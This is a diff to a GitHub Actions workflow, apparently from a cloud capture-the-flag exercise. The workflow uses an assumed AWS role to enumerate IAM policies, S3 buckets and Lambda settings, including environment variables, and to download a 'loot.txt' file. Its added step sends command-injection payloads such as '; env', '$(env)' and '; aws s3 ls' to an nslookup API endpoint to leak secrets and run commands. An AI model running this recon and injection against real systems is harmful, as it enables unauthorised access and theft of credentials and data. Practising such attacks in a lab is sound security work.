@@ -15,10 +15,8 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
-
       - name: AWS identity
         run: aws sts get-caller-identity
-
       - name: What can cicdRole actually do?
         run: |
           echo "===== ATTACHED POLICIES ====="
@@ -34,7 +32,6 @@ jobs:
             ver=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text)
             aws iam get-policy-version --policy-arn "$arn" --version-id "$ver" || true
           done
-
       - name: Full recursive S3 listing (not just top-level)
         run: |
           echo "===== RECURSIVE LISTING ====="
@@ -43,10 +40,8 @@ jobs:
           aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 || true
           echo "===== BUCKET ACL ====="
           aws s3api get-bucket-acl --bucket codec4f26c862a321ef5 || true
-
       - name: List ALL buckets you might have access to
         run: aws s3 ls || true
-
       - name: Read loot file (raw, in case it's not plain text)
         run: |
           aws s3 cp s3://codec4f26c862a321ef5/loot.txt ./loot.txt || true
@@ -54,13 +49,11 @@ jobs:
           xxd ./loot.txt || true
           echo "---- strings ----"
           strings ./loot.txt || true
-
       - name: Full Lambda config incl. env vars
         run: |
           aws lambda get-function-configuration --function-name nslookupv2
           echo "===== LAMBDA POLICY (resource policy) ====="
           aws lambda get-policy --function-name nslookupv2 || true
-
       - name: Lambda role permissions
         run: |
           ROLE_ARN=$(aws lambda get-function-configuration --function-name nslookupv2 --query 'Role' --output text)
@@ -68,5 +61,15 @@ jobs:
           echo "Lambda role: $ROLE_NAME"
           aws iam list-attached-role-policies --role-name "$ROLE_NAME" || true
           aws iam list-role-policies --role-name "$ROLE_NAME" || true
-
       - name: Test command injection in nslookup API
+        run: |
+          echo "===== baseline ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"example.com"}'
+          echo "===== injection: env ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"example.com; env"}'
+          echo "===== injection: subshell env ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"$(env)"}'
+          echo "===== injection: backtick env ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"`env`"}'
+          echo "===== injection: aws s3 ls ====="
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"example.com; aws s3 ls"}'
